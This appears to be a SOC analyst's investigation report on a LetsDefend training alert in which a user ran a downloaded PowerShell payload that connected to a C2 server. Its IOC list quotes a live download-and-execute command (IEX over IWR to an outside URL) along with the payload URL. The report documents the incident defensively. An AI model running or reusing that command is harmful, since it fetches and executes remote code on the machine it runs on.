# SOC153 - Suspicious Powershell Script Executed

| Field | Value |
|---------|---------|
| Alert Name | SOC153 - Suspicious Powershell Script Executed (EventID: 238 from LetsDefend) |
| Date Investigated | 2026-07-06 |
| Event Time | Mar, 14, 2024, 05:23 PM |
| Verdict | True Positive |
| Time Spent | 50 mins |

## 1. Analyst Note

Mar, 14, 2024, 05:22 PM User (Tony) Download a malicious file (url: https://files-ld.s3.us-east-2.amazonaws.com/payload_1.ps1), then 05:23 PM , just 1 minute later excute the payload, and then successfully connected to c2, the parent process is explorer.exe. So this is a true positive alert, and the host is Contained.

## 2. Threat Frameworks & Impact

- **MITRE ATT&CK:**
  - T1059.001 – PowerShell
  - T1071.001 – Application Layer Protocol: Web Protocols (C2 over HTTP/HTTPS)
- **CVE:** N/A
- **Impact:** Medium

## 3. The "Why" (Core Evidence)

- The alert was triggered because a suspicious powershell script executed.
- And the payload successfully connected c2.

## 4. Key IOCs

- **Malicious Payload URL** `https://files-ld.s3.us-east-2.amazonaws.com/payload_1.ps1`
- **File Name** `payload_1.ps1`
- **File Hash** `db8be06ba6d2d3595dd0c86654a48cfc4c0c5408fdd3f4e1eaf342ac7a2479d0`
- **Script Block Text** `"C:\Windows\system32\cmd.exe" /c "powershell -command IEX(IWR -UseBasicParsing 'https://kionagranada.com/upload/sd2.ps1')"`

## 5. Action Taken

- Contained the affected user (**Tony**) to prevent further malicious activity.